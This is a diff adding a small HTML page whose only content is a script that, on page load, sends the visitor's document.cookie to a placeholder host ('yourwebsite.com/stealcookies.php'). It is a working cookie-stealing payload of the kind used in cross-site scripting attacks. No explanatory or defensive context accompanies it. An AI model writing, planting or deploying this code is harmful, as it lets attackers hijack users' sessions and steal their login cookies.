@@ -1,0 +1,11 @@
+<html>
+<body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var http = new XMLHttpRequest();
+            http.open("GET", "http://yourwebsite.com/stealcookies.php?c=" + document.cookie, true);
+            http.send();
+        });
+    </script>
+</body>
+</html>
